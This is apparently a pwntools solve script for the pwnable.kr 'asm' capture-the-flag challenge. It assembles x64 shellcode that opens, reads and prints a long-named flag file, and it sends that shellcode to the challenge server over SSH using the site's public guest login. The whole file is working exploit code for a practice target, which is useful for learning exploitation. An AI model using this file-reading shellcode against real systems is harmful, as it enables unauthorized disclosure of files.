from pwn import *
import sys,getopt
import time,math

context(os='linux', arch='amd64', bits = 64, endian = 'little')
context.terminal = ['tmux', 'splitw', '-h' ]
'''
    int  fd;
    char buf[100] = {0};
    fd = open("/tmp/flag",0,0);
    read(fd,buf,50);
    write(1,buf,50);
    close(fd);
  
'''
def pushstr(string='/home/orw/flag',length=8):
    log.info('pushasm' + string)
    string = string[::-1]
    pushstr = ''
    times = int(math.ceil(float(len(string))/length))
    startpos = 0
    for i in range(1,times+1): 
        ilen = (len(string) - (times-i)*length)
        ilen = ilen if ilen < length else length
        istring = string[startpos:startpos+ilen].encode('hex')
        pushstr += 'mov rax, 0x%s; push rax;' % istring
        #pushstr += 'push 0x%s;' % istring
        log.info('start '+str(startpos)+' end '+str(startpos+ilen))
        startpos += ilen
    log.info(pushstr)
    # log.info("/home/orw/flag\x00".encode('hex'))
    return pushstr

def testasm():
    filename = "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
    shellcode = pushstr(filename)
    shellcode += "mov rax, 0x2; mov rdi, rsp; syscall;" # int 0x80;"
    shellcode += "mov rdi, rax; mov rax, 0x0; mov rsi, 0x202120; mov rdx,100; syscall; " #int 0x80;"
    shellcode += "mov rax, 0x1; mov rdi, 0x1; mov rsi,0x202120; mov rdx,100; syscall; " #"int 0x80;"
    return shellcode

def pwntoolsAsm():
    filename = "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
    shellcode = shellcraft.pushstr(filename)
    shellcode += shellcraft.open('rsp', 0, 0)    
    shellcode += shellcraft.read('rax', 'rsp', 100)
    shellcode += shellcraft.write(1, 'rsp', 100)
    return shellcode

def pwn():
    io.recvuntil("give me your x64 shellcode:")
    shellcode = pwntoolsAsm() #testasm()
    shellcode = asm(shellcode)
    io.sendline(shellcode)
    log.success(io.recvline()) # should not use io.recv() because the process will close immediately


if __name__ == '__main__':
    global local, debug
    local, debug = 0, 0 
    procName = "./asm"
    if local:
        io = process(procName)
    else:
        con = ssh(host='pwnable.kr', user='asm', password='guest', port=2222)
        io = con.connect_remote('localhost', 9026)
    #context.log_level = 'debug'
    if debug:
            gdb.attach(io)
    pwn()
    # io.interactive()
